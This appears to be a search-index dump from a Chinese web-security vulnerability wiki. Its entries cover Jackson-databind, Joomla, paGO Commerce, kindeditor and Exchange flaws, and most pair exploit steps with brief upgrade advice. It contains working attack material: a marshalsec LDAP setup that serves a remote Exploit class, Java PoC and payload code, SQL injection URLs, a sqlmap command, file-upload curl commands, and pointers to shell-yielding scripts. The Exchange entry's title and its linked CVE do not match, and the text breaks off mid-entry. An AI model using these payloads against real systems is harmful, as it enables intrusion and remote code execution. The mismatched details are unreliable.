Jackson\u53d1\u5e03\u4e86\u65b0\u7684\u9ad8\u5371\u6f0f\u6d1e\uff08\u6f0f\u6d1e\u7f16\u53f7\uff1aCVE-2020-24616\uff09\uff0c\u5176\u5b98\u65b9\u56e2\u961f\u53d1\u5e03\u4e86 jackson-databind \u7684\u65b0\u7248\u672c 2.9.10.6\uff0c\u5176\u4e2d\u4fee\u590d\u4e86\u51e0\u4e2a\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u3002 FasterXML Jackson\u662f\u7f8e\u56fdFasterXML\u516c\u53f8\u7684\u4e00\u6b3e\u9002\u7528\u4e8eJava\u7684\u6570\u636e\u5904\u7406\u5de5\u5177\u3002jackson-databind\u662f\u5176\u4e2d\u7684\u4e00\u4e2a\u5177\u6709\u6570\u636e\u7ed1\u5b9a\u529f\u80fd\u7684\u7ec4\u4ef6\u3002 FasterXML jackson-databind 2.9.10.6\u4e4b\u524d\u7684\u7248\u672c\u4e2d\u5b58\u5728\u5b89\u5168\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u6e90\u4e8e\u4e0d\u5b89\u5168\u7684\u53cd\u5e8f\u5217\u5316\u3002\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u901a\u8fc7\u7cbe\u5fc3\u6784\u9020\u7684\u6076\u610f\u8f7d\u8377\u5229\u7528\u8be5\u6f0f\u6d1e\u5728\u7cfb\u7edf\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002 \u5f71\u54cd\u7248\u672c \u00b6 jackson-databind < 2.9.10.6 \u5b89\u5168\u7248\u672c \u00b6 jackson-databind 2.9.10.6 jackson-databind 2.10 \u6f0f\u6d1e\u4fee\u590d \u00b6 1.\u5efa\u8bae\u7528\u6237\u5c06jackson-databind\u7ec4\u4ef6\u5347\u7ea7\u5230\u5b89\u5168\u7248\u672c\u3002 https://github.com/FasterXML/jackson-databind/releases 2.\u5728Jackson 2.10 \u4e2d\u5f15\u5165\u4e86Safe Default Typing\u767d\u540d\u5355\u673a\u5236\uff0c\u53ef\u675c\u7edd\u6b64\u7c7bgadget\u7684\u5f71\u54cd\u3002 POC \u00b6 \u628a\u7f16\u8bd1\u597d\u7684exploit.class\u653e\u7f6e\u5728\u670d\u52a1\u7aef \u5f00\u542fHTTP\u670d\u52a1 python3 -m http.server 8888 \u6216\u8005tomcat\u90fd\u884c \u542f\u52a8LDAP``` java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \u201chttp://x.x.x.x(\u670d\u52a1\u7aefIp):8888/#Exploit\u201d 9999 PS:poc\u4e2d\u7684\u7aef\u53e3\u53f7\u8981\u548cLDAP\u7684\u5bf9\u5e94 \u672c\u5730\u8fd0\u884cjavaPOC cve-2020-24616-poc-master","title":"Jackson\u53cd\u5e8f\u5217\u5316\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c CVE-2020-24616"},{"location":"Web%E5%AE%89%E5%85%A8/Jackson/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%20CVE-2020-24616/#_1","text":"FasterXML Jackson\u53d1\u5e03\u4e86\u65b0\u7684\u9ad8\u5371\u6f0f\u6d1e\uff08\u6f0f\u6d1e\u7f16\u53f7\uff1aCVE-2020-24616\uff09\uff0c\u5176\u5b98\u65b9\u56e2\u961f\u53d1\u5e03\u4e86 jackson-databind \u7684\u65b0\u7248\u672c 2.9.10.6\uff0c\u5176\u4e2d\u4fee\u590d\u4e86\u51e0\u4e2a\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u3002 FasterXML Jackson\u662f\u7f8e\u56fdFasterXML\u516c\u53f8\u7684\u4e00\u6b3e\u9002\u7528\u4e8eJava\u7684\u6570\u636e\u5904\u7406\u5de5\u5177\u3002jackson-databind\u662f\u5176\u4e2d\u7684\u4e00\u4e2a\u5177\u6709\u6570\u636e\u7ed1\u5b9a\u529f\u80fd\u7684\u7ec4\u4ef6\u3002 FasterXML jackson-databind 2.9.10.6\u4e4b\u524d\u7684\u7248\u672c\u4e2d\u5b58\u5728\u5b89\u5168\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u6e90\u4e8e\u4e0d\u5b89\u5168\u7684\u53cd\u5e8f\u5217\u5316\u3002\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u901a\u8fc7\u7cbe\u5fc3\u6784\u9020\u7684\u6076\u610f\u8f7d\u8377\u5229\u7528\u8be5\u6f0f\u6d1e\u5728\u7cfb\u7edf\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"Web%E5%AE%89%E5%85%A8/Jackson/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%20CVE-2020-24616/#_2","text":"jackson-databind < 2.9.10.6","title":"\u5f71\u54cd\u7248\u672c"},{"location":"Web%E5%AE%89%E5%85%A8/Jackson/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%20CVE-2020-24616/#_3","text":"jackson-databind 2.9.10.6 jackson-databind 2.10","title":"\u5b89\u5168\u7248\u672c"},{"location":"Web%E5%AE%89%E5%85%A8/Jackson/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%20CVE-2020-24616/#_4","text":"1.\u5efa\u8bae\u7528\u6237\u5c06jackson-databind\u7ec4\u4ef6\u5347\u7ea7\u5230\u5b89\u5168\u7248\u672c\u3002 https://github.com/FasterXML/jackson-databind/releases 2.\u5728Jackson 2.10 \u4e2d\u5f15\u5165\u4e86Safe Default Typing\u767d\u540d\u5355\u673a\u5236\uff0c\u53ef\u675c\u7edd\u6b64\u7c7bgadget\u7684\u5f71\u54cd\u3002","title":"\u6f0f\u6d1e\u4fee\u590d"},{"location":"Web%E5%AE%89%E5%85%A8/Jackson/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%20CVE-2020-24616/#poc","text":"\u628a\u7f16\u8bd1\u597d\u7684exploit.class\u653e\u7f6e\u5728\u670d\u52a1\u7aef \u5f00\u542fHTTP\u670d\u52a1 python3 -m http.server 8888 \u6216\u8005tomcat\u90fd\u884c \u542f\u52a8LDAP``` java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \u201chttp://x.x.x.x(\u670d\u52a1\u7aefIp):8888/#Exploit\u201d 9999 PS:poc\u4e2d\u7684\u7aef\u53e3\u53f7\u8981\u548cLDAP\u7684\u5bf9\u5e94 \u672c\u5730\u8fd0\u884cjavaPOC cve-2020-24616-poc-master","title":"POC"},{"location":"Web%E5%AE%89%E5%85%A8/Jackson/jackson-databind-rce-cve-2020-9548/","text":"\u5f71\u54cd\u8303\u56f4 \u00b6 \u2022 jackson-databind before 2.9.10.4 \u2022 jackson-databind before 2.8.11.6 \u2022 jackson-databind before 2.7.9.7 \u6f0f\u6d1e\u7c7b\u578b \u00b6 JDNI\u6ce8\u5165\u5bfc\u81f4RCE \u5229\u7528\u6761\u4ef6 \u2022 \u5f00\u542fenableDefaultTyping() \u2022 \u4f7f\u7528\u4e86br.com.anteros.dbcp.AnterosDBCPConfig\u7b2c\u4e09\u65b9\u4f9d\u8d56 \u6f0f\u6d1e\u6982\u8ff0 \u00b6 2020\u5e743\u6708\uff0cjackson-databind\u5728github\u4e0a\u66f4\u65b0\u4e86\u4e00\u4e2a\u65b0\u7684\u53cd\u5e8f\u5217\u5316\u5229\u7528\u7c7bbr.com.anteros.dbcp.AnterosDBCPConfig\uff0c\u8be5\u7c7b\u7ed5\u8fc7\u4e86\u4e4b\u524djackson-databind\u7ef4\u62a4\u7684\u9ed1\u540d\u5355\u7c7b\uff0c\u5e76\u4e14JDK\u7248\u672c\u8f83\u4f4e\u7684\u8bdd\uff0c\u53ef\u9020\u6210RCE\u3002 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u73af\u5883\u642d\u5efa pom.xml\uff1a <dependencies> <dependency> <groupId>com.fasterxml.jackson.core</groupId> <artifactId>jackson-databind</artifactId> <version>2.9.9.1</version> </dependency> <!-- https://mvnrepository.com/artifact/br.com.anteros/Anteros-DBCP --> <dependency> <groupId>br.com.anteros</groupId> <artifactId>Anteros-DBCP</artifactId> <version>1.0.1</version> </dependency> <dependency> <groupId>org.slf4j</groupId> <artifactId>slf4j-nop</artifactId> <version>1.7.2</version> </dependency> <!-- https://mvnrepository.com/artifact/javax.transaction/jta --> <dependency> <groupId>javax.transaction</groupId> <artifactId>jta</artifactId> <version>1.1</version> </dependency> </dependencies> \u6f0f\u6d1e\u5229\u7528 \u00b6 \u7f16\u8bd1Exploit.java Exploit.java\u4ee3\u7801\u5982\u4e0b\uff1a import java.lang.Runtime; public class Exploit { static { try { Runtime.getRuntime().exec(\"calc\"); } catch (Exception e) { e.printStackTrace(); } } } \u642d\u5efaHTTP\u670d\u52a1 \u4f7f\u7528Python\u642d\u5efa\u7b80\u6613SimpleHTTPServer\u670d\u52a1\uff1a \u642d\u5efaLDAP\u670d\u52a1 \u4f7f\u7528marshalsec\u6765\u542f\u52a8\u4e00\u4e2aLDAP\u670d\u52a1\uff1a \u6267\u884c\u6f0f\u6d1ePOC1 Poc.java\u4ee3\u7801\u5982\u4e0b\u6240\u793a\uff1a package com.jacksonTest; import com.fasterxml.jackson.databind.ObjectMapper; import java.io.IOException; public class Poc { public static void main(String[] args) throws Exception { ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); String payload = \"[\\\"br.com.anteros.dbcp.AnterosDBCPConfig\\\", {\\\"metricRegistry\\\":\\\"ldap://127.0.0.1:1099/Exploit\\\"}]\"; try { mapper.readValue(payload, Object.class); } catch (IOException e) { e.printStackTrace(); } } } \u4e4b\u540e\u8fd0\u884c\u8be5\u7a0b\u5e8f\uff0c\u6210\u529f\u6267\u884c\u547d\u4ee4\uff0c\u5f39\u51fa\u8ba1\u7b97\u5668\uff1a \u6f0f\u6d1e\u5206\u6790 \u00b6 \u9996\u5148\u5b9a\u4f4d\u5230br.com.anteros.dbcp.AnterosDBCPConfig\u7c7b\uff0c\u4e4b\u540e\u53d1\u73b0\u4e00\u5904\u53ef\u7591\u7684JNDI\u6ce8\u5165\uff1a \u7531\u4e8e\u53c2\u6570\u6765\u81eaobject\uff0c\u6240\u4ee5\u4e4b\u540e\u5168\u5c40\u641c\u7d22\u8c03\u7528getObjectOrPerformJndiLookup\u51fd\u6570\u8c03\u7528\u7684\u5730\u65b9\u53d1\u73b0setMetricRegistry\u5904\u6709\u4e00\u5904\u53ef\u63a7\u7684\u8c03\u7528\uff0c\u6b64\u5904\u7684\u53c2\u6570metricRegistry\u53ef\u6709json\u6307\u5b9a\uff0c\u4e4b\u540e\u4f20\u5165getObjectOrPerformJndiLookup\uff0c\u4e4b\u540e\u518d\u6b21\u4f20\u5165lookup\uff0c\u4ece\u800c\u5bfc\u81f4JNDI\u6ce8\u5165\u7684\u53d1\u751f\uff0c\u5e76\u6700\u7ec8\u5bfc\u81f4RCE: \u6574\u4e2a\u5229\u7528\u94fe\u5982\u4e0b\u6240\u793a\uff1a mapper.readValue ->setMetricRegistry ->getObjectOrPerformJndiLookup ->lookup \u4fee\u590d\u5efa\u8bae \u00b6 \u2022 \u53ca\u65f6\u5c06jackson-databind\u5347\u7ea7\u5230\u5b89\u5168\u7248\u672c \u2022 \u5347\u7ea7\u5230\u8f83\u9ad8\u7248\u672c\u7684JDK\u3002 \u53c2\u8003\u94fe\u63a5 https://github.com/FasterXML/jackson-databind/issues/2634","title":"jackson-databind RCE CVE-2020-9548"},{"location":"Web%E5%AE%89%E5%85%A8/Jackson/jackson-databind-rce-cve-2020-9548/#_1","text":"\u2022 jackson-databind before 2.9.10.4 \u2022 jackson-databind before 2.8.11.6 \u2022 jackson-databind before 2.7.9.7","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"Web%E5%AE%89%E5%85%A8/Jackson/jackson-databind-rce-cve-2020-9548/#_2","text":"JDNI\u6ce8\u5165\u5bfc\u81f4RCE \u5229\u7528\u6761\u4ef6 \u2022 \u5f00\u542fenableDefaultTyping() \u2022 \u4f7f\u7528\u4e86br.com.anteros.dbcp.AnterosDBCPConfig\u7b2c\u4e09\u65b9\u4f9d\u8d56","title":"\u6f0f\u6d1e\u7c7b\u578b"},{"location":"Web%E5%AE%89%E5%85%A8/Jackson/jackson-databind-rce-cve-2020-9548/#_3","text":"2020\u5e743\u6708\uff0cjackson-databind\u5728github\u4e0a\u66f4\u65b0\u4e86\u4e00\u4e2a\u65b0\u7684\u53cd\u5e8f\u5217\u5316\u5229\u7528\u7c7bbr.com.anteros.dbcp.AnterosDBCPConfig\uff0c\u8be5\u7c7b\u7ed5\u8fc7\u4e86\u4e4b\u524djackson-databind\u7ef4\u62a4\u7684\u9ed1\u540d\u5355\u7c7b\uff0c\u5e76\u4e14JDK\u7248\u672c\u8f83\u4f4e\u7684\u8bdd\uff0c\u53ef\u9020\u6210RCE\u3002","title":"\u6f0f\u6d1e\u6982\u8ff0"},{"location":"Web%E5%AE%89%E5%85%A8/Jackson/jackson-databind-rce-cve-2020-9548/#_4","text":"\u73af\u5883\u642d\u5efa pom.xml\uff1a <dependencies> <dependency> <groupId>com.fasterxml.jackson.core</groupId> <artifactId>jackson-databind</artifactId> <version>2.9.9.1</version> </dependency> <!-- https://mvnrepository.com/artifact/br.com.anteros/Anteros-DBCP --> <dependency> <groupId>br.com.anteros</groupId> <artifactId>Anteros-DBCP</artifactId> <version>1.0.1</version> </dependency> <dependency> <groupId>org.slf4j</groupId> <artifactId>slf4j-nop</artifactId> <version>1.7.2</version> </dependency> <!-- https://mvnrepository.com/artifact/javax.transaction/jta --> <dependency> <groupId>javax.transaction</groupId> <artifactId>jta</artifactId> <version>1.1</version> </dependency> </dependencies>","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"Web%E5%AE%89%E5%85%A8/Jackson/jackson-databind-rce-cve-2020-9548/#_5","text":"\u7f16\u8bd1Exploit.java Exploit.java\u4ee3\u7801\u5982\u4e0b\uff1a import java.lang.Runtime; public class Exploit { static { try { Runtime.getRuntime().exec(\"calc\"); } catch (Exception e) { e.printStackTrace(); } } } \u642d\u5efaHTTP\u670d\u52a1 \u4f7f\u7528Python\u642d\u5efa\u7b80\u6613SimpleHTTPServer\u670d\u52a1\uff1a \u642d\u5efaLDAP\u670d\u52a1 \u4f7f\u7528marshalsec\u6765\u542f\u52a8\u4e00\u4e2aLDAP\u670d\u52a1\uff1a \u6267\u884c\u6f0f\u6d1ePOC1 Poc.java\u4ee3\u7801\u5982\u4e0b\u6240\u793a\uff1a package com.jacksonTest; import com.fasterxml.jackson.databind.ObjectMapper; import java.io.IOException; public class Poc { public static void main(String[] args) throws Exception { ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); String payload = \"[\\\"br.com.anteros.dbcp.AnterosDBCPConfig\\\", {\\\"metricRegistry\\\":\\\"ldap://127.0.0.1:1099/Exploit\\\"}]\"; try { mapper.readValue(payload, Object.class); } catch (IOException e) { e.printStackTrace(); } } } \u4e4b\u540e\u8fd0\u884c\u8be5\u7a0b\u5e8f\uff0c\u6210\u529f\u6267\u884c\u547d\u4ee4\uff0c\u5f39\u51fa\u8ba1\u7b97\u5668\uff1a","title":"\u6f0f\u6d1e\u5229\u7528"},{"location":"Web%E5%AE%89%E5%85%A8/Jackson/jackson-databind-rce-cve-2020-9548/#_6","text":"\u9996\u5148\u5b9a\u4f4d\u5230br.com.anteros.dbcp.AnterosDBCPConfig\u7c7b\uff0c\u4e4b\u540e\u53d1\u73b0\u4e00\u5904\u53ef\u7591\u7684JNDI\u6ce8\u5165\uff1a \u7531\u4e8e\u53c2\u6570\u6765\u81eaobject\uff0c\u6240\u4ee5\u4e4b\u540e\u5168\u5c40\u641c\u7d22\u8c03\u7528getObjectOrPerformJndiLookup\u51fd\u6570\u8c03\u7528\u7684\u5730\u65b9\u53d1\u73b0setMetricRegistry\u5904\u6709\u4e00\u5904\u53ef\u63a7\u7684\u8c03\u7528\uff0c\u6b64\u5904\u7684\u53c2\u6570metricRegistry\u53ef\u6709json\u6307\u5b9a\uff0c\u4e4b\u540e\u4f20\u5165getObjectOrPerformJndiLookup\uff0c\u4e4b\u540e\u518d\u6b21\u4f20\u5165lookup\uff0c\u4ece\u800c\u5bfc\u81f4JNDI\u6ce8\u5165\u7684\u53d1\u751f\uff0c\u5e76\u6700\u7ec8\u5bfc\u81f4RCE: \u6574\u4e2a\u5229\u7528\u94fe\u5982\u4e0b\u6240\u793a\uff1a mapper.readValue ->setMetricRegistry ->getObjectOrPerformJndiLookup ->lookup","title":"\u6f0f\u6d1e\u5206\u6790"},{"location":"Web%E5%AE%89%E5%85%A8/Jackson/jackson-databind-rce-cve-2020-9548/#_7","text":"\u2022 \u53ca\u65f6\u5c06jackson-databind\u5347\u7ea7\u5230\u5b89\u5168\u7248\u672c \u2022 \u5347\u7ea7\u5230\u8f83\u9ad8\u7248\u672c\u7684JDK\u3002 \u53c2\u8003\u94fe\u63a5 https://github.com/FasterXML/jackson-databind/issues/2634","title":"\u4fee\u590d\u5efa\u8bae"},{"location":"Web%E5%AE%89%E5%85%A8/Joomla/Joomla%203.7.0%20%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9ECVE-2017-8917/","text":"\u7b80\u4ecb \u00b6 \u6f0f\u6d1e\u662f\u7531\u6b64Joomla 3.7.0 \u7248\u672c\u4e2d\u5f15\u5165\u7684\u65b0\u7ec4\u4ef6\uff08com_fields\uff09\u5e26\u6765\u7684 \u73af\u5883\u642d\u5efa \u00b6 cd /root/vulhub/joomla/CVE-2017-8917 docker-compose up -d \u542f\u52a8\u540e\u8bbf\u95eehttp://your-ip:8080\u5373\u53ef\u770b\u5230Joomla\u7684\u5b89\u88c5\u754c\u9762 \u6309\u7167\u987a\u5e8f\u5b89\u88c5\u5373\u53ef \u5b89\u88c5\u5b8c\u6210\u540e\uff0c\u8bbf\u95eehttp://your-ip:8080/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,user()),1)\uff0c\u5373\u53ef\u770b\u5230\u62a5\u9519\u4fe1\u606f\uff1a","title":"Joomla 3.7.0  SQL\u6ce8\u5165\u6f0f\u6d1eCVE-2017-8917"},{"location":"Web%E5%AE%89%E5%85%A8/Joomla/Joomla%203.7.0%20%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9ECVE-2017-8917/#_1","text":"\u6f0f\u6d1e\u662f\u7531\u6b64Joomla 3.7.0 \u7248\u672c\u4e2d\u5f15\u5165\u7684\u65b0\u7ec4\u4ef6\uff08com_fields\uff09\u5e26\u6765\u7684","title":"\u7b80\u4ecb"},{"location":"Web%E5%AE%89%E5%85%A8/Joomla/Joomla%203.7.0%20%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9ECVE-2017-8917/#_2","text":"cd /root/vulhub/joomla/CVE-2017-8917 docker-compose up -d \u542f\u52a8\u540e\u8bbf\u95eehttp://your-ip:8080\u5373\u53ef\u770b\u5230Joomla\u7684\u5b89\u88c5\u754c\u9762 \u6309\u7167\u987a\u5e8f\u5b89\u88c5\u5373\u53ef \u5b89\u88c5\u5b8c\u6210\u540e\uff0c\u8bbf\u95eehttp://your-ip:8080/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,user()),1)\uff0c\u5373\u53ef\u770b\u5230\u62a5\u9519\u4fe1\u606f\uff1a","title":"\u73af\u5883\u642d\u5efa"},{"location":"Web%E5%AE%89%E5%85%A8/Joomla/Joomla%21%20paGO%20Commerce%202.5.9.0%20%E5%AD%98%E5%9C%A8SQL%20%E6%B3%A8%E2%BC%8A/","text":"POST /joomla/administrator/index.php?option=com_pago&view=comments HTTP/1.1 2 Host: localhost 3 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0 4 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 5 Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3 6 Accept-Encoding: gzip, deflate 7 Content-Type: application/x-www-form-urlencoded 8 Content-Length: 163 9 Origin: http://localhost 10 Connection: close 11 Referer: http://localhost/joomla/administrator/index.php?option=com_pago&view=comments 12 Cookie: 4bde113dfc9bf88a13de3b5b9eabe495=sp6rp5mqnihh2i323r57cvesoe; crisp-client%2Fsession%2F0 13 Upgrade-Insecure-Requests: 1 14 15 filter_search=&limit=10&filter_published=1&task=&controller=comments&boxchecked=0&filter_order= ```POC``` sqlmap -r pago --dbs --risk=3 --level=5 --random-agent -p filter_published","title":"Joomla! paGO Commerce 2.5.9.0 \u5b58\u5728SQL \u6ce8\u2f0a"},{"location":"Web%E5%AE%89%E5%85%A8/Joomla/JoomlaRCE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88CVE-2020-11890%EF%BC%89/","text":"JoomlaRCE\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff08CVE-2020-11890\uff09 \u00b6 \u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-09-23 16:18:31 \u7b80\u4ecb \u00b6 Joomla! CMS versions 2.5.0 \u2013 3.9.16\u7248\u672c\u5728\u5904\u7406\u7528\u6237\u7ec4\u65f6\u7f3a\u5c11\u5bf9\u6839\u7528\u6237\u7ec4\u7684\u68c0\u67e5\uff0c\u4ece\u800c\u5bfc\u81f4\u4e86\u4e00\u4e2a\u63d0\u6743\u6f0f\u6d1e\u7684\u4ea7\u751f(CVE-2020-11890)\u3002 \u5f71\u54cd\u7248\u672c \u00b6 CMS versions 2.5.0 - 3.9.16 POC \u00b6 \u94fe\u63a5\uff1ahttps://pan.baidu.com/s/1iDkl9dnCjIEXCJ1QvMLEeQ \u63d0\u53d6\u7801\uff1awhu7 py -2 1.py -url http://192.168.2.109/cms/ -u admin -p admin \u7ed9\u51fa\u4e86shell\u5730\u5740 \u4fee\u590d\u5efa\u8bae \u00b6 \u5347\u7ea7\u5230\u6700\u65b0\u7248","title":"JoomlaRCE\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff08CVE-2020-11890\uff09"},{"location":"Web%E5%AE%89%E5%85%A8/Joomla/JoomlaRCE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88CVE-2020-11890%EF%BC%89/#joomlarcecve-2020-11890","text":"\u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-09-23 16:18:31","title":"JoomlaRCE\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff08CVE-2020-11890\uff09"},{"location":"Web%E5%AE%89%E5%85%A8/Joomla/JoomlaRCE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88CVE-2020-11890%EF%BC%89/#_1","text":"Joomla! CMS versions 2.5.0 \u2013 3.9.16\u7248\u672c\u5728\u5904\u7406\u7528\u6237\u7ec4\u65f6\u7f3a\u5c11\u5bf9\u6839\u7528\u6237\u7ec4\u7684\u68c0\u67e5\uff0c\u4ece\u800c\u5bfc\u81f4\u4e86\u4e00\u4e2a\u63d0\u6743\u6f0f\u6d1e\u7684\u4ea7\u751f(CVE-2020-11890)\u3002","title":"\u7b80\u4ecb"},{"location":"Web%E5%AE%89%E5%85%A8/Joomla/JoomlaRCE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88CVE-2020-11890%EF%BC%89/#_2","text":"CMS versions 2.5.0 - 3.9.16","title":"\u5f71\u54cd\u7248\u672c"},{"location":"Web%E5%AE%89%E5%85%A8/Joomla/JoomlaRCE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88CVE-2020-11890%EF%BC%89/#poc","text":"\u94fe\u63a5\uff1ahttps://pan.baidu.com/s/1iDkl9dnCjIEXCJ1QvMLEeQ \u63d0\u53d6\u7801\uff1awhu7 py -2 1.py -url http://192.168.2.109/cms/ -u admin -p admin \u7ed9\u51fa\u4e86shell\u5730\u5740","title":"POC"},{"location":"Web%E5%AE%89%E5%85%A8/Joomla/JoomlaRCE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88CVE-2020-11890%EF%BC%89/#_3","text":"\u5347\u7ea7\u5230\u6700\u65b0\u7248","title":"\u4fee\u590d\u5efa\u8bae"},{"location":"Web%E5%AE%89%E5%85%A8/Kindeditor/kindeditor%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u5f71\u54cd \u00b6 kindeditor <= 4.1.11 \u6f0f\u6d1ePOC \u00b6 curl -F\"imgFile=@a.html\" http://127.0.0.1/kindeditor/php/upload_json.php?dir=file curl -F\"imgFile=@a.html\" http://127.0.0.1/kindeditor/asp/upload_json.asp?dir=file curl -F\"imgFile=@a.html\" http://127.0.0.1/kindeditor/jsp/upload_json.jsp?dir=file curl -F\"imgFile=@a.html\" http://127.0.0.1/kindeditor/aspx/upload_json.aspx?dir=file \u200b```\u8fd4\u56de\u503c\u4e3a\u8def\u5f84","title":"kindeditor\u4e0a\u4f20\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/Kindeditor/kindeditor%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#_1","text":"kindeditor <= 4.1.11","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"Web%E5%AE%89%E5%85%A8/Kindeditor/kindeditor%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#poc","text":"curl -F\"imgFile=@a.html\" http://127.0.0.1/kindeditor/php/upload_json.php?dir=file curl -F\"imgFile=@a.html\" http://127.0.0.1/kindeditor/asp/upload_json.asp?dir=file curl -F\"imgFile=@a.html\" http://127.0.0.1/kindeditor/jsp/upload_json.jsp?dir=file curl -F\"imgFile=@a.html\" http://127.0.0.1/kindeditor/aspx/upload_json.aspx?dir=file \u200b```\u8fd4\u56de\u503c\u4e3a\u8def\u5f84","title":"\u6f0f\u6d1ePOC"},{"location":"Web%E5%AE%89%E5%85%A8/Microsoft%20Exchange%20Server/CVE-2020-0688%20Microsoft%20Exchange%20Server%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Microsoft Exchange Server\u662f\u5fae\u8f6f\u516c\u53f8\u63a8\u51fa\u7684\u4e00\u5957\u5546\u4e1a\u7535\u5b50\u90ae\u4ef6\u7cfb\u7edf\uff0c\u56e0\u5176\u7a33\u5b9a\u3001\u6613\u7528\u3001\u5b89\u5168\u7b49\u7279\u70b9\u5728\u5168\u7403\u591a\u4e2a\u884c\u4e1a\u88ab\u5e7f\u6cdb\u5730\u5e94\u7528\u3002\u7531\u4e8eExchange Server\u5728\u5b89\u88c5\u90e8\u7f72\u65f6\u672a\u80fd\u521b\u5efa\u5e94\u7528\u552f\u4e00\u7684\u52a0\u5bc6\u5bc6\u94a5\uff0c\u5bfc\u81f4Exchange Server\u5728\u53cd\u5e8f\u5217\u5316\u5904\u7406\u8bf7\u6c42\u4e2d\u7684 __VIEWSTATE \u6570\u636e\u89e6\u53d1\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u3002Exchange \u662f\u4ee5SYSTEM\u6743\u9650\u542f\u7528\u7684IIS\uff0c\u56e0\u6b64\u666e\u901a\u767b\u5f55\u7528\u6237\u4e5f\u53ef\u901a\u8fc7\u53cd\u5e8f\u5217\u5316\u8fbe\u5230\u63d0\u6743\u7684\u76ee\u7684\uff0c\u8fdb\u800c\u53ef\u4ee5\u83b7\u53d6\u57df\u7ba1\u7406\u7684\u6743\u9650\u3002 \u5f71\u54cd\u7248\u672c \u00b6 Microsoft Exchange Server 2019 Microsoft Exchange Server 2016 Microsoft Exchange Server 2013 Microsoft Exchange Server 2010 \u5f71\u54cd\u7248\u672c \u00b6 microsoft:exchange_server_2016: cu16/cu17 microsoft:exchange_server_2019: cu5/cu6 \u4fee\u590d\u5efa\u8bae \u00b6 \u5efa\u8bae\u5e7f\u5927\u7528\u6237\u53ca\u65f6\u5b89\u88c5\u6700\u65b0\u8865\u4e01\uff0c\u8865\u4e01\u5bf9\u5e94\u7248\u672c\u4e0e\u4e0b\u8f7d\u5730\u5740\u5982\u4e0b\uff1a https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16875 \u5feb\u901f\u5229\u7528\u89c6\u9891\u94fe\u63a5 https://youtu.be/7d_HoQ0LVy8 ps \u7248POC\uff1ahttps://srcincite.io/pocs/cve-2020-16875.ps1.txt https://srcincite.io/pocs/cve-2020- 16875.ps1.txt py \u7248POC\uff1ahttps://srcincite.io/pocs/cve-2020-16875.py.txt https://srcincite.io/pocs/cve-2020- 16875.py.txt","title":"CVE-2020-0688 Microsoft Exchange 